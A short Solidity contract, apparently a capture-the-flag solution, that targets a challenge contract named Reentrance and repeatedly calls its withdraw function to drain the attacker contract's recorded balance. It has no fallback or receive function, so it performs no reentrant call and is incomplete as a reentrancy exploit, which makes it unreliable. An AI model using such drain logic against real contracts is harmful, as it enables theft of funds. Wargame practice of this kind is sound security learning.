pragma solidity ^0.8.0;

interface Reentrance {
    function balanceOf(address _who) external view returns (uint256 balance);
    function withdraw(uint256 _amount) external returns (bool success);
    function isSolved() external view returns (bool);
}

contract BalanceManipulator {
    Reentrance public reentranceContract;
    address public targetAddress;

    constructor(address _targetAddress) {
        reentranceContract = Reentrance(_targetAddress);
        targetAddress = _targetAddress;
    }

    function drainBalance() public {
        while (reentranceContract.balanceOf(address(this)) > 0) {
            reentranceContract.withdraw(reentranceContract.balanceOf(address(this)));
        }
    }

    function isSolved() public view returns (bool) {
        return reentranceContract.isSolved();
    }
}
